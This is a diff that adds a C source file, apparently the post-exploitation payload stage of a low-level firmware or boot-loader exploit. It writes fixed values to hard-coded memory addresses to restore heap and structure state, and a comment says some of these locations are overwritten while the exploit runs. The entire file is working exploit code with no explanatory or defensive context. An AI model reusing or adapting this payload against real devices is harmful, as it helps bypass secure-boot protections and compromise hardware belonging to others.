@@ -1,0 +1,55 @@
+#include <stdint.h>
+
+#define BASE_ADDRESS 0x5ff00000
+
+void _start() {
+	*(uint32_t*)(BASE_ADDRESS + 0x42170) = 0x0; /* 0xe9 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42174) = 0x0; /* 0x70000 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42178) = 0x0; /* 0x6 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4217c) = 0x0; /* 0x5ffa8178 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4223c) = 0xffffffff; /* 0x103c -> 0xffffffff */
+	*(uint32_t*)(BASE_ADDRESS + 0x42258) = 0x0; /* 0x5ff4ebc0 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4225c) = 0xffffffff; /* 0x2 -> 0xffffffff */
+	*(uint32_t*)(BASE_ADDRESS + 0x42260) = 0x0; /* 0x1 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42268) = 0x0; /* 0x5ff51980 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4226c) = 0x1; /* 0x10 -> 0x1 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42270) = 0x5ff42270; /* 0x5ffa82c0 -> 0x5ff42270 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42274) = 0x5ff42270; /* 0x5ff48440 -> 0x5ff42270 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422a8) = 0x5ff422a8; /* 0x5ff53a00 -> 0x5ff422a8 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422ac) = 0x5ff422a8; /* 0x5ff53480 -> 0x5ff422a8 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422b0) = 0x5ff422b0; /* 0x5ff6fc00 -> 0x5ff422b0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422b4) = 0x5ff422b0; /* 0x5ff6fc00 -> 0x5ff422b0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422bc) = 0xffffffff; /* 0x5ff48394 -> 0xffffffff */
+	*(uint32_t*)(BASE_ADDRESS + 0x422c0) = 0xffffffff; /* 0xaec6c -> 0xffffffff */
+	*(uint32_t*)(BASE_ADDRESS + 0x422c4) = 0x0; /* 0x1 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422e0) = 0x5ff42300; /* 0x5ff91840 -> 0x5ff42300 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422f0) = 0x5ff422f0; /* 0x5ffa5b4c -> 0x5ff422f0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422f4) = 0x5ff422f0; /* 0x5ffa5b4c -> 0x5ff422f0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422f8) = 0x5ff422f8; /* 0x5ff46584 -> 0x5ff422f8 */
+	*(uint32_t*)(BASE_ADDRESS + 0x422fc) = 0x5ff422f8; /* 0x5ffa8ec4 -> 0x5ff422f8 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42314) = 0x2; /* 0x5 -> 0x2 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4231c) = 0x0; /* 0x5ff4ad4c -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42320) = 0x0; /* 0x5ff46570 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42324) = 0x0; /* 0x5ff422f0 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42328) = 0x0; /* 0x5fff7fe8 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4232c) = 0x0; /* 0x5ff422e0 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42338) = 0x0; /* 0x8403bfd4 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4233c) = 0x0; /* 0x5fff7fd8 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42340) = 0x0; /* 0x5ff1d9af -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x4246c) = 0x0; /* 0x5ff4246c -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42470) = 0x0; /* 0x5ff4246c -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x424a0) = 0xffffffff; /* 0x5fff8000 -> 0xffffffff */
+	*(uint32_t*)(BASE_ADDRESS + 0x42ab0) = 0x4000; /* 0x5ac4000 -> 0x4000 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42ab4) = 0x0; /* 0x1281 -> 0x0 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42ab8) = 0x1000000; /* 0x1040302 -> 0x1000000 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42ac4) = 0x5ff42ac4; /* 0x5ff90b00 -> 0x5ff42ac4 */
+	*(uint32_t*)(BASE_ADDRESS + 0x42ac8) = 0x5ff42ac4; /* 0x5ff90b00 -> 0x5ff42ac4 */
+
+	/* These are overwritten during exection of the exploit. */
+	*(uint32_t*)(BASE_ADDRESS + 0xA040) = 0xf89de7d8;
+	*(uint32_t*)(BASE_ADDRESS + 0xA044) = 0x280e0018;
+	*(uint32_t*)(BASE_ADDRESS + 0xa0c0) = 0xf1ba4000;
+	*(uint32_t*)(BASE_ADDRESS + 0xa0c4) = 0xbfc80f02;
+	*(uint32_t*)(BASE_ADDRESS + 0xa100) = 0x5ff43e54;
+	*(uint32_t*)(BASE_ADDRESS + 0xa104) = 0xaf01b590;
+}
